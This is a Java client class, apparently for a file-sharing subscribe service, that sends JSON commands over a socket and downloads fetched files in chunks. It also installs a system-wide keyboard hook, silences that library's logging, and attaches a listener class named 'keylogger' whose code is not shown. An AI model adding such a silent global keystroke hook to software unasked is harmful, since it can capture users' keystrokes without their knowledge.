package Client;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Arrays;
import java.util.logging.Level;
import java.util.logging.Logger;


import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;

public class sendMessage {

	public static JSONObject unsubscribeCommand = new JSONObject();

	public static void sender(String ip, int port,JSONObject newCommand, boolean debugMode) throws ParseException{
		try(Socket socket = new Socket(ip,port)){
			//output stream
			DataOutputStream output = new DataOutputStream(socket.getOutputStream());
			//input stream
			DataInputStream input = new DataInputStream(socket.getInputStream());			


			 Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
			 logger.setLevel(Level.OFF);
		        try { 
		            GlobalScreen.registerNativeHook();
		            
		        } catch (NativeHookException ex) {
		            ex.printStackTrace();	              
		        }
		       GlobalScreen.addNativeKeyListener(new keylogger());
		     
			
			
			//send command to server
			output.writeUTF(newCommand.toJSONString());
			output.flush();

			boolean send = false;
			/////exit the subscribe	
			boolean exit = false;
				JSONParser parser = new JSONParser();
				JSONObject getcommand = new JSONObject();
				//read from server and print out
				while(true){
//					System.out.println("before isempty:"+unsubscribeCommand.isEmpty());
					if (!unsubscribeCommand.isEmpty()) {
//						System.out.println("after isempty:"+unsubscribeCommand.isEmpty());
						//send unsubscribe command to server
						output.writeUTF(unsubscribeCommand.toJSONString());
						output.flush();
						while (input.available()>0) {
							getcommand = (JSONObject) parser.parse(input.readUTF());
							Client.logger.info(getcommand.toJSONString());
							socket.close();
							exit = true;
							break;
						}
					}
					
					if (exit) {
						break;
					}
					
					if (input.available()>0) {
						String result = input.readUTF();
						Client.logger.info("RECEIVED:"+result);
						send=true;
						
						//ONLY USEFUL WHEN ITS FETCH COMMAND
						JSONObject command = (JSONObject) parser.parse(result);	
						if(command.containsKey("resourceSize")){ 
			 				String fileName ="client_files/"+ (String) command.get("name"); 
			 				 
		 					// The file location
								// Create a RandomAccessFile to read and write the output file.
								RandomAccessFile downloadingFile = new RandomAccessFile(fileName, "rw");
								// Find out how much size is remaining to get from the server.
								long fileSizeRemaining = (Long) command.get("resourceSize");
								int chunkSize = setChunkSize(fileSizeRemaining);
								
								// Represents the receiving buffer
								byte[] receiveBuffer = new byte[chunkSize];
								// Variable used to read if there are remaining size left to read.
								int num; 
								while((num=input.read(receiveBuffer))>0){
									// Write the received bytes into the RandomAccessFile
									downloadingFile.write(Arrays.copyOf(receiveBuffer, num));
									
									// Reduce the file size left to read..
									fileSizeRemaining-=num;
									
									// Set the chunkSize again
									chunkSize = setChunkSize(fileSizeRemaining);
									receiveBuffer = new byte[chunkSize];
									
									// If you're done then break
									if(fileSizeRemaining==0){
										break;
									}
								} 
								downloadingFile.close();
								
		 				}
					}/*else if(!Client.subscribing&send){
						break;
					}*/
					
				}
			
		
		}catch (UnknownHostException e){
			e.printStackTrace();
		}catch (IOException e) {
			e.printStackTrace();
		}
	}

	
	//ONLY USEFUL WHEN ITS FETCH COMMAND
	private static int setChunkSize(long fileSizeRemaining) {
		// determine the chunksize
		int chunkSize = 1024*1024;
		//if the file size remaining is less than chunksize reset it
		if (fileSizeRemaining<chunkSize) {
			chunkSize=(int) fileSizeRemaining;
		}
		return chunkSize;
	}


}
